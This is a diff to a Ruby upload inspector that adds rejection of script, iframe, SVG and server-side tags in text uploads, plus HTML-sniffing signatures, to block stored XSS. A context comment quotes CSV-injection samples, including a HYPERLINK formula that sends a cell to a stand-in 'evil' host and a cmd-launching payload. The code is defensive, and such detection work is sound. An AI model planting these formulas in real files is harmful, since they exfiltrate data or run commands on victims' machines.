@@ -9,6 +9,8 @@ module UploadInspector
   # - CSV/TSV only, unless allow_csv_formulas: no cell that a spreadsheet would run as a
   #   formula calling a function or another program (CSV injection), e.g.
   #   =HYPERLINK("http://evil/?"&A1), +cmd|' /C calc'!A0, @SUM(1)
+  # - unless allow_text_markup: no HTML, SVG or server-side script tags. A browser or proxy
+  #   that sniffs content (missing nosniff, old IE) renders such a .txt as a page (stored XSS).
   class TextInspector
     include Rejectable
 
@@ -26,6 +28,18 @@ module UploadInspector
     # (program|topic!item); arithmetic, negative numbers, phone numbers like +1 (555) 010 and
     # @handles stay accepted.
     FORMULA_ACTION = /\p{L}[\p{L}\d_.]*\(|\|/
+    # Anywhere: opening tags that run or load something, raw-text elements (their content is
+    # not read as tags, which would desync HtmlHandlerScanner from the browser) and server-side
+    # tags. Event handlers on any tag are found by HtmlHandlerScanner. Data like "a<b",
+    # "x < html" or "<b>bold</b>" passes.
+    MARKUP = %r{
+      <(?:script|html|head|body|iframe|frame|svg|math|form|object|embed|meta|base|link|style|img
+         |textarea|title|xmp|noembed|noframes|noscript|plaintext|template)[\s/>]
+      | <\?php | <% | <!doctype\s+html
+    }xi
+    # At the start (after whitespace), the WHATWG MIME sniffing signatures that make a browser
+    # treat the whole file as HTML or XML.
+    SNIFFED_AS_HTML = /\A\s*(?:<(?:!doctype\s+html|html|head|script|iframe|h1|div|font|table|a|style|title|b|body|br|p)[\s>]|<!--|<\?xml)/i
 
     def initialize(policy)
       @policy = policy
@@ -39,10 +53,16 @@ module UploadInspector
       text = text.delete_prefix(UTF8_BOM).force_encoding(Encoding::UTF_8)
       reject!(:text_unsupported_encoding, 'not valid UTF-8') unless text.valid_encoding?
       reject!(:text_binary_content, 'control characters') if text.match?(CONTROL)
+      check_markup!(text) unless @policy.allow_text_markup
       check_formulas!(text) if SPREADSHEET_TYPES.include?(type) && !@policy.allow_csv_formulas
     end
 
   private
+
+    def check_markup!(text)
+      found = text[SNIFFED_AS_HTML] || text[MARKUP] || HtmlHandlerScanner.find(text)
+      reject!(:text_markup, found.strip[0, 40]) if found
+    end
 
     def check_formulas!(text)
       text.scan(FORMULA_CELL) do |quoted, bare|
